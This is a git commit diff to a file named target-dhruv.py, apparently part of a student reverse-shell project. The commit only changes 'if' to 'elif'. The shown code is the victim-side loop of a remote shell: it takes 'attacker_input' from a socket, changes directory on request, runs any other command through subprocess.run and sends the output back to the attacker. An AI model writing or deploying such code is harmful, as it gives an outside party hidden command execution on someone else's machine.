acab9673c5ad49603e97ae9457f03dcee2482f89
DhruvArora-03 <dhruvarora@utexas.edu>
2024-03-03 19:31:05 -0600

    use elif

--- target-dhruv.py
+++ target-dhruv.py
@@ -24,13 +24,13 @@ try:
         if attacker_input == 'exit':
             s.close()
             break
-        if attacker_input[0] == 'cd':
+        elif attacker_input[0] == 'cd':
             if len(attacker_input) != 2:
                 s.send('Please only use cd by itself with one argument. ex: "cd _____"')
             else:
                 os.chdir(attacker_input[1])
                 s.send(b'\n')
-        if len(attacker_input) > 0:
+        elif len(attacker_input) > 0:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             s.send(result.stdout)
             # encrypted_data = asymmetric_encryption.encrypt_message(attacker_input, pub_key)
